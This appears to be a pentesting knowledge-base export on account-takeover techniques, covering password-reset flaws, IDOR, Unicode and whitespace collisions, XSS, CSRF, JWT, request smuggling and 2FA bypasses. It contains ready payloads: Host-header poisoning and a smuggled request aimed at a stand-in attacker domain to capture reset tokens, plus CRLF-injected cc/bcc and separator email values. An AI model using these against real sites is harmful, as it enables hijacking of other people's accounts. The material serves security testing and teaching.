entries.title: What ATO is and where to look for it
entries.body:
Account Takeover (ATO) is the unauthorized seizure of someone else's account through various vectors. Main attack surfaces:
• Password reset - the primary source: token leakage, host-header poisoning, IDOR, weak/predictable tokens, manipulation of the email parameter.
• Username/email collisions and normalization (whitespace, Unicode).
• Web vulnerabilities leading to ATO: XSS (session theft), CSRF (password/email change), HTTP Request Smuggling, JWT manipulation.
• MFA/2FA bypass (see separate section): response manipulation, code reuse, brute-force, backup codes.

entries.title: Password reset - attack checklist
entries.body:
1. Token leaks via Referer to third-party resources.
2. Reset-link poisoning via Host / X-Forwarded-Host (password reset poisoning).
3. Injecting your own email via parameter pollution, array, cc/bcc, separators.
4. IDOR in the password-change API (substituting userID/email).
5. Weak/predictable/reusable reset token.
6. resetToken leaking directly in the server response body.
7. Username collision (leading/trailing whitespace) and Unicode email normalization.

entries.title: Reset-token leakage via Referer
entries.body:
1. Request a password reset to your own email.
2. Follow the reset link from the email.
3. Do NOT change the password.
4. Click any link to a third-party site (for example, Facebook, Twitter).
5. Intercept the request in Burp Suite.
6. Check whether the reset token leaks in the Referer header.

If the reset page loads external resources (analytics, fonts, widgets), the token from the URL may be sent to an external domain in the Referer.

entries.title: Password Reset Poisoning via the Host header
entries.body:
1. Intercept the password-reset request in Burp Suite.
2. Add or change the headers: `Host: [ATTACKER.DOMAIN.TLD]`, `X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]`.
3. Send the request with the spoofed header.
4. Wait for a reset link built from the host header, in the form: `https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN`.

If the backend builds the absolute email URL from the Host header, the victim's token will be sent to your domain.

entries.title: Password Reset Poisoning - example request
entries.body:
POST https://example.com/reset.php HTTP/1.1
Accept: */*
Content-Type: application/json
Host: [ATTACKER.DOMAIN.TLD]

entries.title: Injecting an email via a parameter (parameter pollution / cc / separators)
entries.body:
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com

entries.title: IDOR in the password-change API
entries.body:
1. Log in with your own account and go to the Change password feature.
2. Launch Burp Suite and intercept the request.
3. Send it to Repeater and substitute the parameters: User ID / email with the victim's values.

If the password change is tied to the supplied identifier rather than the session one, the victim's password gets changed.

entries.title: IDOR in the password-change API - example request
entries.body:
POST /api/changepass
[...]
("form": {"email":"victim@email.com","password":"securepwd"})

entries.title: Weak/predictable reset token
entries.body:
The reset token should be random and unique on every request. Check whether it expires and whether it repeats - sometimes the generation algorithm is weak and the token can be guessed. The generation may rely on predictable data:
• Timestamp
• UserID
• User's email
• First and last name
• Date of birth
• Cryptography (weak/home-grown)
• Digits only
• Short sequence (<6 characters from [A-Z,a-z,0-9])
• Token reuse
• No token expiration

entries.title: Reset-token leakage in the response body
entries.body:
1. Trigger a password reset via the API/UI for a specific email, for example: test@mail.com.
2. Examine the server response and look for a `resetToken` field.
3. Use the token in a URL of the form: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`.

entries.title: Password reset via username collision (whitespace)
entries.body:
1. Register with a username identical to the victim's, but with whitespace before and/or after, for example: `"admin "`.
2. Request a password reset for your "malicious" username.
3. Use the token from your own email and reset the victim's password.
4. Log into the victim's account with the new password.

The CTFd platform was vulnerable to this attack - CVE-2020-7245.

entries.title: ATO via Unicode normalization
entries.body:
When processing Unicode input (case mapping or normalization), unexpected behavior is possible: different characters collapse into one and two accounts are treated as "the same".

• Victim's account: `demo@gmail.com`
• Attacker's account: `demⓞ@gmail.com`

Tools: Unisub (finding Unicode characters that collapse into the desired character) and the Unicode pentester cheatsheet (a list of suitable characters for a specific platform).

entries.title: ATO via XSS (session theft)
entries.body:
1. Find an XSS in the application or on a subdomain, if the cookie is scoped to the parent domain: `*.domain.com`.
2. Steal the current session cookie.
3. Authenticate as the user using that cookie.

If the session cookie lacks the HttpOnly flag or the scope is too broad, an XSS on any subdomain leads to ATO.

entries.title: ATO via HTTP Request Smuggling
entries.body:
See also the HTTP Request Smuggling vulnerability page.

1. Determine the smuggling type (CL, TE, CL.TE) using smuggler:

git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -h

2. Craft a request that will overwrite `POST / HTTP/1.1` with the following data:

GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
X:

3. The final request may look like this (see the separate entry with the example).

entries.title: HTTP Request Smuggling - final request
entries.body:
GET /  HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
X: X

entries.title: ATO via CSRF
entries.body:
1. Create a CSRF payload, for example an HTML form with auto-submit targeting the password change.
2. Deliver the payload to the victim.

If the password/email change is not protected by a CSRF token and does not require entering the current password, this leads to account takeover.

entries.title: ATO via JWT
entries.body:
A JWT may be used to authenticate the user.

• Change the User ID / Email in the JWT to another one.
• Check for a weak JWT signature (alg:none, weak secret, RS256→HS256 confusion).

entries.title: Response Manipulation
entries.body:
If the response has `"success":false`, change it to `"success":true`.

The client may trust the flag from the response and let you through when the response is tampered with in a proxy.

entries.title: Status Code Manipulation
entries.body: If the status code is 4xx, try replacing it with 200 OK and check whether that lifts the restriction.

entries.title: 2FA code leakage in the response
entries.body: Check the response to the request that triggers sending the 2FA code - sometimes the code itself leaks directly in the response body.

entries.title: Analyzing JS files
entries.body: Rare, but some JS files contain information about the 2FA code - worth checking.

entries.title: 2FA code reuse
entries.body: The same code can be used repeatedly (no invalidation after the first successful use).

entries.title: No brute-force protection
entries.body: You can brute-force a 2FA code of any length - there is no rate-limit and no attempt limit.

entries.title: Missing Integrity Validation
entries.body: A code issued for any account passes the 2FA check on a different account (the code is not bound to a specific user).

entries.title: CSRF on disabling 2FA
entries.body: Disabling 2FA has no CSRF protection and no re-authentication confirmation - the victim's 2FA can be disabled via a forged request.

entries.title: Password reset disables 2FA
entries.body: 2FA gets disabled when the password or email is changed - after a reset you can log in without the second factor.

entries.title: Abusing backup codes
entries.body: Bypassing 2FA via the backup-codes feature. Apply the same techniques to the backup code (response/status manipulation, brute-force, missing binding) to lift/reset the 2FA restrictions.

entries.title: Clickjacking on the 2FA disable page
entries.body: Place the 2FA disable page in an iframe and use social engineering to make the victim disable 2FA (if there is no X-Frame-Options / CSP frame-ancestors).

entries.title: Enabling 2FA does not terminate active sessions
entries.body: If the session is already hijacked and there is a session-timeout vulnerability, enabling 2FA does not invalidate previously active sessions and access is retained.

entries.title: 2FA bypass via Force Browsing
entries.body: If with 2FA enabled the login redirects to `/2fa/verify`, while without 2FA it goes straight to `/my-account`, try manually navigating to `/my-account` instead of `/2fa/verify` to skip verification.

entries.title: 2FA bypass with a null or 000000 value
entries.body: Enter the code 000000 or null to bypass the 2FA protection (the backend may treat an empty/default value as valid).
